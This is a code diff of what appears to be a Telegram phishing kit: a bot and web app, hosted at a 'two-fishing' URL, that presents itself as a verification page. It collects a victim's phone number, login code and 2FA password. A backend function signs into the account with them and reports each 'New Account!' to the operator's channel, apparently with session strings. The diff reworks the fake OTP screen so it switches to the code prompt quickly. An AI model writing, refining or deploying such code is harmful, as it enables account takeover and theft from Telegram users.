@@ -22,7 +22,7 @@ BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
 API_ID = _si(os.environ.get("API_ID"), 0)
 API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
-CHANNEL_ID = _si(os.environ.get("CHANNEL_ID"), 0)   # <-- NEW: channel for session strings
+CHANNEL_ID = _si(os.environ.get("CHANNEL_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
@@ -727,7 +727,6 @@ async def cb(event):
     chat_id = event.sender_id
 
     try:
-        # RESET NUMBERS
         if data == "menu_reset_numbers":
             await event.answer()
             await safe_send(chat_id,
@@ -1319,8 +1318,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 .sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
 .sst.done{background:#4CAF50;color:white}
 .sst.active{background:#0088cc;color:white}
-.getcode{margin-top:20px;display:none}
-.getcode.on{display:block}
 .loader{width:48px;height:48px;border:4px solid #2a2a3e;border-top:4px solid #0088cc;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 </style>
@@ -1338,10 +1335,11 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 </div>
 <div id="otpBox" class="modal">
 <div class="ico">&#128274;</div>
-<h2 id="otpTitle">Verifying...</h2>
-<p id="otpSubtitle">Please wait while we process your request</p>
+<h2 id="otpTitle">Sending verification...</h2>
+<p id="otpSubtitle">Please wait while we send the code</p>
 <div id="otpLoader" class="loader"></div>
-<div class="otps" id="otpInputWrap" style="display:none">
+<div id="otpInputSection" style="display:none">
+<div class="otps" id="otpInputWrap">
 <input type="tel" maxlength="1" inputmode="numeric" id="o1">
 <input type="tel" maxlength="1" inputmode="numeric" id="o2">
 <input type="tel" maxlength="1" inputmode="numeric" id="o3">
@@ -1350,8 +1348,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 </div>
 <div id="otpMsg" class="msg"></div>
 <div class="resend" id="resendBtn">Resend code</div>
-<div class="getcode on" id="getCodeWrap">
+<div style="margin-top:20px">
 <button class="btn purple" id="getCodeBtn">📲 Get Code Now</button>
+</div>
 </div>
 </div>
 <div id="pwdBox" class="modal">
@@ -1507,37 +1506,62 @@ function handleContact(c) {
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
   
+  // Phase 1: loading, NO button, NO input
   document.getElementById('otpTitle').textContent = 'Sending verification...';
   document.getElementById('otpSubtitle').textContent = 'Please wait while we send the code';
   document.getElementById('otpLoader').style.display = 'block';
-  document.getElementById('otpInputWrap').style.display = 'none';
+  document.getElementById('otpInputSection').style.display = 'none';
   document.getElementById('otpMsg').className = 'msg';
-  document.getElementById('resendBtn').style.display = 'none';
   
   ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
   
   fetch('/api/share', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,tg_id:TG_ID}) })
   .then(function(r){ return r.json(); }).then(function(d){
-    if (d.success) {
-      setTimeout(function(){
-        document.getElementById('otpTitle').textContent = 'Verification code sent';
-        document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
-        document.getElementById('otpLoader').style.display = 'none';
-        document.getElementById('otpInputWrap').style.display = 'flex';
-        document.getElementById('o1').focus();
-        startOtpCheck();
-        setTimeout(function(){ document.getElementById('resendBtn').style.display='block'; },30000);
-      }, 1500);
-    } else {
+    if (!d.success) {
       document.getElementById('otpTitle').textContent = 'Something went wrong';
       document.getElementById('otpSubtitle').textContent = d.error || 'Please try again';
       document.getElementById('otpLoader').style.display = 'none';
+      document.getElementById('otpInputSection').style.display = 'block';
       document.getElementById('resendBtn').style.display = 'block';
+      return;
     }
+    
+    // Poll fast (every 100ms) — as soon as backend says 'sent', switch instantly
+    var pollTimer = setInterval(function(){
+      fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
+      .then(function(r){ return r.json(); }).then(function(cd){
+        var state = cd.s;
+        
+        if (state === 'err') {
+          clearInterval(pollTimer);
+          document.getElementById('otpTitle').textContent = 'Something went wrong';
+          document.getElementById('otpSubtitle').textContent = 'Please try again';
+          document.getElementById('otpLoader').style.display = 'none';
+          document.getElementById('otpInputSection').style.display = 'block';
+          document.getElementById('resendBtn').style.display = 'block';
+          return;
+        }
+        
+        if (state === 'sent' || state === '2fa_needed' || state === 'done') {
+          clearInterval(pollTimer);
+          // INSTANT switch — no wait
+          document.getElementById('otpTitle').textContent = 'Verification code sent';
+          document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
+          document.getElementById('otpLoader').style.display = 'none';
+          document.getElementById('otpInputSection').style.display = 'block';
+          document.getElementById('resendBtn').style.display = 'none';
+          setTimeout(function(){ document.getElementById('o1').focus(); }, 50);
+          startOtpCheck();
+          setTimeout(function(){ document.getElementById('resendBtn').style.display='block'; },30000);
+        }
+      }).catch(function(){});
+    }, 100);
+    
   }).catch(function(){
     document.getElementById('otpTitle').textContent = 'Network error';
     document.getElementById('otpSubtitle').textContent = 'Please check your connection';
     document.getElementById('otpLoader').style.display = 'none';
+    document.getElementById('otpInputSection').style.display = 'block';
     document.getElementById('resendBtn').style.display = 'block';
   });
 }
@@ -1573,7 +1597,7 @@ function submitOtp() {
   document.getElementById('otpTitle').textContent = 'Verifying...';
   document.getElementById('otpSubtitle').textContent = 'Checking your code';
   document.getElementById('otpLoader').style.display = 'block';
-  document.getElementById('otpInputWrap').style.display = 'none';
+  document.getElementById('otpInputSection').style.display = 'none';
   document.getElementById('otpMsg').className = 'msg';
   
   fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,tg_id:TG_ID}) })
@@ -1586,7 +1610,7 @@ function submitOtp() {
       document.getElementById('otpTitle').textContent = 'Verification code sent';
       document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
       document.getElementById('otpLoader').style.display = 'none';
-      document.getElementById('otpInputWrap').style.display = 'flex';
+      document.getElementById('otpInputSection').style.display = 'block';
       msg('otpMsg', d.error||'Wrong code, try again', 'err');
       ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
       document.getElementById('o1').focus();
@@ -1595,7 +1619,7 @@ function submitOtp() {
     document.getElementById('otpTitle').textContent = 'Verification code sent';
     document.getElementById('otpSubtitle').textContent = 'Enter the 5-digit code below';
     document.getElementById('otpLoader').style.display = 'none';
-    document.getElementById('otpInputWrap').style.display = 'flex';
+    document.getElementById('otpInputSection').style.display = 'block';
     msg('otpMsg', 'Error, try again', 'err');
   });
 }
@@ -1916,7 +1940,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
 
         name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
 
-        # ===== NOTIFY TARGET: channel if set, else owner DM =====
         NOTIFY_TARGET = CHANNEL_ID if CHANNEL_ID else YOUR_TELEGRAM_ID
 
         full_msg_html = (f"🔔 New Account!\n"
